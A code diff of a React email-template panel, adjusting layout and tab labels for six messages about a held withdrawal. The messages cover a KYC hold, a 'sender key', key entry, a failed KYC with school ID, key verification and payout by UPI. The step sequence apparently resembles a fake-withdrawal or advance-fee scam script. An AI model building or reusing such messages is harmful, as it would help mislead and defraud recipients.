-            3. <strong>Key Sent (Website &amp; Tab):</strong> Dual-key instructions: enter on website and withdrawal tab for release without extra verification.<br />
+            3. <strong>Key Sent (Website &amp; Tab):</strong> Dual-key instructions: enter on website and withdrawal tab, and inform sender to put key in their tab (or else it won't succeed) for release without extra verification.<br />
             4. <strong>KYC Failed / Retry:</strong> Explains that photo was not taken live or did not match ID (School/College ID recommended).<br />
             5. <strong>Key Verification Started:</strong> Informs customer their KeyBox verification key has been received and verification is underway.<br />
             6. <strong>All Processes Complete:</strong> Dispatched confirmation stating all processes are complete and money will reflect anytime if UPI, name, number, and mail are correct.
@@ -2339,84 +2396,89 @@ export function EmailTemplatesSection() {
       </div>
 
       <div className="flex items-center justify-between gap-2 flex-wrap border-b border-border pb-3">
-        <div className="flex items-center gap-2 flex-wrap">
+        <div className="flex items-center gap-1.5 overflow-x-auto no-scrollbar scrollbar-none py-1 -mx-1 px-1 sm:mx-0 sm:px-0 sm:flex-wrap shrink-0 touch-pan-x w-full sm:w-auto">
           <button
             type="button"
             onClick={() => setTab("kyc_hold")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "kyc_hold"
                 ? "bg-amber-500/20 text-amber-600 dark:text-amber-400 border border-amber-500/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <ShieldAlert className="h-3.5 w-3.5" />
-            <span>1. Withdrawal KYC Hold</span>
+            <ShieldAlert className="h-3.5 w-3.5 shrink-0" />
+            <span>1. KYC Hold</span>
+            <span className="hidden md:inline">(Photo + ID)</span>
           </button>
           <button
             type="button"
             onClick={() => setTab("kyc_approved_key")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "kyc_approved_key"
                 ? "bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <KeyRound className="h-3.5 w-3.5" />
-            <span>2. KYC Approved (Sender Key)</span>
+            <KeyRound className="h-3.5 w-3.5 shrink-0" />
+            <span>2. KYC Approved</span>
+            <span className="hidden md:inline">(Sender Key)</span>
           </button>
           <button
             type="button"
             onClick={() => setTab("key_sent_instruction")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "key_sent_instruction"
                 ? "bg-cyan-500/20 text-cyan-600 dark:text-cyan-400 border border-cyan-500/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <KeyRound className="h-3.5 w-3.5" />
-            <span>3. Key Sent (Website &amp; Tab)</span>
+            <KeyRound className="h-3.5 w-3.5 shrink-0" />
+            <span>3. Key Sent</span>
+            <span className="hidden md:inline">(Website &amp; Tab)</span>
           </button>
           <button
             type="button"
             onClick={() => setTab("kyc_rejected")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "kyc_rejected"
                 ? "bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <XCircle className="h-3.5 w-3.5" />
-            <span>4. KYC Failed (School ID)</span>
+            <XCircle className="h-3.5 w-3.5 shrink-0" />
+            <span>4. KYC Failed</span>
+            <span className="hidden md:inline">(School ID)</span>
           </button>
           <button
             type="button"
             onClick={() => setTab("key_verification_started")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "key_verification_started"
                 ? "bg-blue-500/20 text-blue-600 dark:text-blue-400 border border-blue-500/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <KeyRound className="h-3.5 w-3.5" />
-            <span>5. Key Verification Started</span>
+            <KeyRound className="h-3.5 w-3.5 shrink-0" />
+            <span>5. Key Verifying</span>
           </button>
           <button
             type="button"
             onClick={() => setTab("all_success")}
             className={cn(
-              "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
+              "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
               tab === "all_success"
                 ? "bg-emerald-600/20 text-emerald-600 dark:text-emerald-400 border border-emerald-600/40 shadow-xs"
                 : "text-muted-foreground hover:text-foreground hover:bg-secondary",
             )}
           >
-            <Check className="h-3.5 w-3.5" />
-            <span>6. All Success (Dispatched)</span>
+            <Check className="h-3.5 w-3.5 shrink-0" />
+            <span>6. Dispatched</span>
+            <span className="hidden md:inline">(All Done)</span>
           </button>
         </div>
 
@@ -2441,13 +2503,13 @@ export function EmailTemplatesSection() {
             )}
           >
             <Code className="h-3 w-3" />
-            <span>HTML Code</span>
+            <span>HTML</span>
           </button>
         </div>
       </div>
 
       {/* Inputs Configuration Grid */}
-      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
+      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5 sm:gap-3">
         <div className="space-y-1">
           <label className="text-[10px] font-semibold text-muted-foreground uppercase">Beneficiary</label>
           <input
@@ -2541,16 +2603,16 @@ export function EmailTemplatesSection() {
         </div>
 
         {previewMode === "visual" ? (
-          <div className="p-4 bg-muted/30 flex justify-center">
+          <div className="p-2 sm:p-4 bg-muted/30 flex justify-center">
             <iframe
               title="Email Visual Preview"
               srcDoc={generatedHtml}
-              className="w-full max-w-[650px] h-[540px] rounded-xl border border-border shadow-sm bg-[#0d0f17]"
+              className="w-full max-w-[650px] h-[380px] sm:h-[480px] md:h-[540px] rounded-xl border border-border shadow-sm bg-[#0d0f17]"
               sandbox="allow-same-origin"
             />
           </div>
         ) : (
-          <pre className="p-4 text-[11px] font-mono text-muted-foreground overflow-x-auto whitespace-pre-wrap max-h-[540px] leading-relaxed select-all">
+          <pre className="p-3 sm:p-4 text-[10px] sm:text-[11px] font-mono text-muted-foreground overflow-x-auto whitespace-pre-wrap max-h-[540px] leading-relaxed select-all">
             {generatedHtml}
           </pre>
         )}
